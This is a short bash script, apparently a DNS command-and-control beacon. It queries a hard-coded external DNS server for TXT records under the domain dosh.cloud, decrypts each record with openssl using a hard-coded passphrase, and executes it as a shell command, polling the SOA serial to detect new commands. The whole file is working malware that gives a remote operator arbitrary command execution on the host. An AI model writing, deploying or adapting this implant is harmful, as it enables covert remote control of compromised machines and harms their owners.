#!/bin/bash
# Beacon to DNS server 

domain="dosh.cloud"
current=0
pass="c2FuZHRvbWIK"
# Pull down commands from server
pull(){
    # Get number of commands to query for
    num=$(dig @129.21.130.212 -t txt +short num.dosh.cloud)
    len=$(echo ${#num})
    num=$(echo ${num:1:len-2})

    # Loop through gathering each command and executing
    x=1
    while [ $x -le $num ]; do
        cmd=$(dig @129.21.130.212 -t txt +short $x.$domain)
        len=$(echo ${#cmd})
        # Remove quotations
        cmd=$(echo ${cmd:1:len-2})
        # Decode the command
        cmd=$(echo $cmd | openssl enc -aes-256-cbc -d -a -k $pass)
        $cmd
        let x=x+1
    done
}

check(){
    serial=$(dig @129.21.130.212 -t soa +short $domain | awk '{print $3}')
    echo $serial
}


# Main driver for beacon
main(){
    new=$(check)
    if [ $new -gt $current ]; then
        pull
    fi
}

main
